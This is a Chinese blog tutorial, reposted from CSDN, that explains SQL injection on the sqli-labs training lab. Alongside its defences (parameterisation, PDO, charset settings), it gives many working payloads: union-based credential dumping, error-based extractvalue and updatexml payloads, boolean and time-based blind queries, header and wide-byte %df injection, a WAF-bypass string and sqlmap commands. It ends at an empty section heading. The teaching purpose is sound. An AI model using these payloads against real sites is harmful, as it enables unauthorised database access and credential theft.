---
title: sql注入详解
date: 2022-11-26 2:30:00
updated: 2022-11-26 2:58:00
tag: 
  - CTF
  - hack
---

{% note info flat %}本文引用自 [山山而川'blog](https://blog.csdn.net/qq_44159028/article/details/114325805){% endnote %}

***

### 前言

结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。

SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。

**即**：<font  color=BlueViolet>**注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询**</font>

在学习sql注入前，我们需要了解sql语句的基本语法 ——> [mysql基础学习](https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163875545216780269895046%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163875545216780269895046&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-114327303.pc_v2_rank_blog_default&utm_term=mysql&spm=1018.2226.3001.4450)

## 一、漏洞原因分析

我们都知道web分为前端和后端，前端负责进行展示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询

我们可以举一个例子，以[sqli-labs](https://github.com/Audi-1/sqli-labs)第一关为例，按要求在url后面加上?id=1，显示如下

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B1.png)

当我们改变id的值为2是，页面发生了改变。说明它将我们输入的数据代入到了数据中进行查询，页面根据输入数据的不同展示的内容也不同。

ps：url中?代表传值的意思，id代表变量，后面的"="代表变量的值

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B2.png)

为了更清楚的看清sql语句的执行与变化过程，我们先修改源代码，打开Less-1/index.php，在源码中添加如下语句将执行的sql语句打印出来，方便我们查看

```php
echo '执行的sql语句为：'.$sql;
echo '<br/>';
echo '<br/>';
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B3.png)

访问页面如下，打印出了执行的sql语句

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B4.png)

在1后面加上单引号, ?id=1'，页面显示有语法错误，说靠近 '1'' limit 0,1有语法错误，我们输入的数据 1' 被完整的带入到了SQL语句中，即直接与原有的sql语句进行了拼接。然后执行的sql语句变成了

```php
$sql="SELECT * FROM users WHERE id='  1 ' ' LIMIT 0,1";
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B5.png)

我们输入的那个单引号和前面的单引号产生了闭合，导致原有后面的那个单引号变成了多余，而sql语法中引号是必须成对出现的否则就会报错。

既然输入的单引号成了多余也就证明程序没有对我们的输入进行过滤，那我们就构造语句将单引号进行闭合就好了。我们在1后面加上单引号，与前面的引号构成闭合，再接着在后面插入我们自己想要查询的语句就可以查询我们想要查询的数据，就这样被脱库的风险就悄悄的发生。

## 二、漏洞危害

SQL注入漏洞对于数据安全的影响：

* **数据库信息泄漏：**数据库中存放的用户的隐私信息的泄露。
* **网页篡改：**通过操作数据库对特定网页进行篡改。
* **网站被挂马，传播恶意软件：**修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
* **数据库被恶意操作：**数据库服务器被攻击，数据库的系统管理员帐户被窜改。
* **服务器被远程控制，被安装后门：**经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
* **破坏硬盘数据，瘫痪全系统。**

## 三、sql注入防范

解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：

代码层面：

  1. 对输入进行严格的转义和过滤
  2. 使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了"拼接"的方式,所以使用时需要慎重!
  3. PDO预处理 (Java、PHP防范推荐方法：)

⛔没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入

网络层面：

  1. 通过WAF设备启用防SQL Inject注入策略（或类似防护系统）
  2. 云端防护（如阿里云盾）

## 四、如何挖掘sql注入漏洞

#### 1. 注入可能存在的地方

既然是sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id=1

如我们看见这种就可以考虑
![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612195905209.png)

或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612200112789.png)

或者是HTTP请求头部字段如Cookie值，下面会讲到。

#### 2. 漏洞探测

此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试
```
#判断如下闭合方式是否会报错，会报错则肯定存在注入
=test'                         
=test"                         
#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞
=test' and -1=-1 or '
=test' and -1=-2 or '  
         
=test" and -1=-1 or "
=test" and -1=-2 or "
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612200244975.png)

ps：目前网站的sql注入基本都能通过漏洞扫描器xray检测出来 ——> xray与burp联动，但是这样动静太大（公网上），如果在内网中可以直接挂上xray进行检测。所以在公网时可以手动检测是否存在漏洞，然后在存在漏洞的地方打上*，接着复制整个请求包在txt文档中用sqlmap -r进行注入 ——> sqlmap -r

补充：

*get型*

1. 进行url编码

在url中进行测试payload需要先进行url编码

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612205739314.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612205903343.png)

不进行编码的话，也可以用+代替空格，#代替--+ 。 %23代表#，也是注释符

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612210342291.png)

*post型*

如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612211327475.png)

## 五、常见的注入手法
SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。

*<font color=purple>参数类型分类</font>*

1. 数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

如 www.text.com/text.php?id=3 对应的sql语句为 select * from table where id=3

2. 字符型：字符型注入正好相反

当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹

例如数字型语句：select * from table where id =3

则字符型如下：select * from table where name=’admin’

*<font color=purple>注入手法分类</font>*

@   UNION query SQL injection（联合查询注入）
@   Error-based SQL injection（错型注入）
@   Boolean-based blind SQL injection（基于布尔的盲注）
@   Time-based blind SQL injection（基于时间的盲注）
@   Stacked queries SQL injection（可多语句查询注入）

为了练习sql注入，我们使用sqli-labs靶场进行sql注入学习，网上有很多安装教程这里就不演示了。建议学这个之前先学习mysql语法，不然理解不了sql语句

### 联合查询(union注入)

<font color=red>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</font>

漏洞靶场实战，传送门 -》[webug 4.0 第一关 显错注入](https://blog.csdn.net/qq_44159028/article/details/115969983)

我们以sqli-labs第一关为例来学习联合查询。如下，要求我们传入一个id值过去

传参?id=1

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210303182305532.png)

1. 页面观察

当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了

2. 注入点判断

开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210303182730727.png)

继续判断 

?id=1' and 1=1 --+   页面正常显示   传送门 -》[关于sql注入中的 --+](https://blog.csdn.net/qq_44159028/article/details/114808681)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314225806936.png)

?id=1' and 1=2 --+  页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314225831842.png)

3. 判断当前表的字段个数

```
?id=1 order by 3 --+   
```

传送门 -》[关于order by](https://blog.csdn.net/qq_44159028/article/details/114809458) 

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314232328721.png)

?id=1 order by 4 --+ ,此时显示未知的列，说明此时当前表中只有3列

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314232352443.png)

4. 判断显示位

上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显

```
?id=-1' union select 1,2,3 --+ 
```

让union select前面的参数查不出来，所以id=-1'

如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314233755850.png)

5. 爆数据库名字

```
?id=-1' union select 1,database(),3 --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315143610789.png)

6. 爆数据库中的表

```
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

其中爆出来数据库中存在三个表

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315225817625.png)

7. 爆表中的字段

我们这里选择一个表，users进行进一步的获取表中的字段值

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

获取到三个字段，分别为id,username,password

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315230239161.png)

8. 爆相应字段的所有数据

```
?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/202103152309268.png)

至此，一次完整的脱库过程结束了，联合查询也就结束了。

### 报错注入

>   报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。
>   报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。
>   推荐三种报错注入的方法，直接套用就行。以less-1为例子

#### 1. group by 重复键冲
   
```
and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
```

提交如下，获取数据库名字

```
?id=1' and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316093930798.png)

#### 2. extractvalue() 函数

```
?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+
```

提交 ?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+  获取数据库名字

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316094306845.png)

#### 3. updatexml() 函数

```
and updatexml(1,concat('^',(需要查询的内容),'^'),1)
```

1. 提交如下，获取数据库名字

```
?id=1' and updatexml(1,concat('^',(database()),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021031609453822.png)

2. 获取当前数据库中表的名字

```
?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316094730140.png)

这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema='security' 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095213384.png)


如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users

3. 爆表中的字段

```
?id=1' and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095511672.png)

总共爆出的字段为： id , username , password

4. 爆字段中的内容

```
?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+
```

三组用户名和密码。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095719686.png)

### 基于布尔的盲注

布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例

1. 我们输入正确的id，显示You are in .....

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021031617333684.png)

我们输入错误的语句如id=1' ，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316173450459.png)

源码如下

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1 ";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
 
	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
    echo '<font size="5" color="#FFFF00">';
    ｝
```

所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316182126690.png)

1. 判断数据库类型

* MySQL数据库表     information_schema.tables
* access            msysobjects 
* SQLServer         sysobjects
用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库

```
//判断是否是 Mysql数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from information_schema.tables) --+
//判断是否是 access数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from msysobjects) --+
//判断是否是 Sqlserver数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) --+
```
![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316174105779.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316174130279.png)

所以当前数据库为mysql数据库

2. 判断当前数据库名

```
1：判断当前数据库的长度，利用二分法
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>5 --+  //正常显示
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>10 --+  //不显示任何数据
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>7 --+  //正常显示
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>8 --+  //不显示任何数据
 
  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符
 
2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断
//判断数据库的第一个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>115 --+ //100为ascii表中的十进制，对应字母s
//判断数据库的第二个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100 --+
//判断数据库的第三个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),3,1))>100 --+
...........
由此可以判断出当前数据库为 security
```

3. 判断当前库的表名

```
//猜测当前数据库中是否存在admin表
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin) --+
1：判断当前数据库中表的个数
// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>3 --+
 
2：判断每个表的长度
//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>6 --+
//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+
 
3：判断每个表的每个字符的ascii值
//判断第一个表的第一个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+
//判断第一个表的第二个字符的ascii值               
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 --+
.........
由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
```

1. 判断表的字段

* 判断字段个数
* 判断每个字段的长度
* 猜每个字段的字符

```
//如果已经证实了存在admin表，那么猜测是否存在username字段
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select username from admin) 
  
1：判断表中字段的个数
//判断users表中字段个数是否大于5
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(column_name) from information_schema.columns where table_name='users' and table_schema='security')>5 --+
 
2：判断每个字段的长度
//判断第一个字段的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5 --+
//判断第二个字段的长度   
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))>5 --+
 
3：判断每个字段名字的ascii值
//判断第一个字段的第一个字符的ascii
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --+
//判断第一个字段的第二个字符的ascii
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))>100 --+
...........
 
由此可判断出users表中存在 id、username、password 字段
```

5. 爆字段中的数据

* 猜字段中数据的长度
* 猜字段数据的每个字符ascii码 得字符

```
我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据
 
1: 判断数据的长度
// 判断id字段的第一个数据的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5 --+
// 判断id字段的第二个数据的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5 --+
 
2：判断数据的ascii值
// 判断id字段的第一行数据的第一个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit  0,1),1,1))>100 --+
// 判断id字段的第二行数据的第二个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100 --+
...........
```

一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。

### 基于时间的盲注

也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”--延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id=1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323093339458.png)

1. 延时注入

```
?id=1' and sleep(5) --+   
```

如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323093826373.png)

2. 获取数据库名字

延时注入与布尔盲注类似，构造方法如下，提交参数
```
?id=1' and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+
```
> if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 传送门-》[mysql基础学习](https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646302616780261917189%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646302616780261917189&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114327303.pc_v1_rank_blog_v1&utm_term=mysql)

代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。

页面显示延时5 秒，说明数据库名字第一个字母的ASCII 值是115，也就是字母s。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323094248951.png)

3. 数据库名字第二个字母的判断，
```
?id=1' and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+
```
与盲注类似，后面就是猜数，这就是延时注入

<font color=red>可以绕waf的payload</font>

```
and(select*from(select+sleep(4))a/**/union/**/select+1)='
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323095412921.png)

### HTTP头注入

常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323100756615.png)

产生注入的条件：

- 能够对请求头消息进行修改

- 修改的请求头信息能够带入数据库进行查询

- 数据库没有对输入的请求信息做过滤

#### 1. User-Agent注入

User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。

以sqli-labs less-18关为例，登录用户密码：dumb ,0

1.1 判断注入点：user-agent值后面加上'，引发报错，确定存在sql注入

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101045836.png)

1.2 采用报错注入函数获取当前数据库名

```
' and updatexml(1,concat('^',(database()),'^'),1) and '
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101137486.png)

#### 2. cookie注入

cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》[cookie](https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646553116780266210214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie) 。以sqli-labs less-20关为例，登录后

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101350105.png)

2.1 首先判断注入点，加 ' 单引号报错

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101417342.png)

2.2 采用报错注入函数获取当前数据库名

```
' and updatexml(1,concat('^',(database()),'^'),1) and '
```

#### 3. Referer注入

Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。

以19关为例

1. 判断输入点，加单引号引发报错

2. 使用报错注入函数：
```
‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and '
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101809562.png)

方法都是一样的。

#### 4. X-Forwarded-For 注入

X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。详见，传送门 -》X-Forwarded-For sql注入

### 宽字节注入

**宽字节案例引入**

宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id=1' 进行测试的时候，发现提交的单引号会被转义[\']。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210324174905605.png)

接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query("SET NAMES gbk")，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210820152802384.png)

仔细看该函数，其利用正则匹配将 [ /，'，" ]这些三个符号都过滤掉了

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821102033527.png)

关于preg_replace的正则用法可详看——> [命令执行与代码执行漏洞](https://blog.csdn.net/qq_44159028/article/details/114642034) 中搜索preg_replace 

而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：

1. 让斜杠（\）失去作用
2. 让斜杠（\）消失

第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。

**关于编码**

在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看 ——> [计算机中的编码问题](https://blog.csdn.net/qq_44159028/article/details/115201653)

1. 某字符的大小为一个字节时，称其字符为窄字节.
2. 当某字符的大小为两个字节时，称其字符为宽字节.
3. 所有英文默认占一个字节，汉字占两个字节
4. 常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等

**宽字节注入**

宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。

由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的

我们在前面加上 %df'  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c'，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ' ,被认为運' ,成功消除了转义函数的影响。

* '           %27
* \           %5c
* %df\'    %df%5c' =》  運'

我们输入 ?id=1%df'，按道理来说将转义符吃掉了，结果应该是 id=' 運'  ' ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821100701673.png)

其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821100948766.png)

联合注入如下

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210324175615607.png)

**GB2312与GBK的不同**

gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821231155171.png)

结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821232112841.png)

为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。

所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。

#### 宽字节注入注入方法

##### 1. 黑盒

就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如

```
sqlmap.py -u "http://localhost/sqli-labs-master/Less-32/?id=1%df%27"
```

##### 2. 白盒

查看mysql是否为GBK编码，且是否使用`preg_replace()`把单引号转换成\'或自带函数`addslashes()`进行转义

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821231155171.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821232504840.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233043656.png)

如果存在上面说的，则存在宽字节注入。

#### 宽字节注入修复

##### 1. mysql_real_escape_string

听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。

‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233922778.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233900317.png)

为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？

原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍

> mysqli_set_charset(connection,charset);

|参数	|描述|
|---|---|
|connection	|必需。规定要使用的 MySQL 连接。|
|charset|	必需。规定默认字符集。|

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821234529785.png)

这样就防止了注入

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821234552955.png)

1. 先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。

2. 设置参数,character_set_client=binary

3. 使用utf-8编码

### 堆叠查询

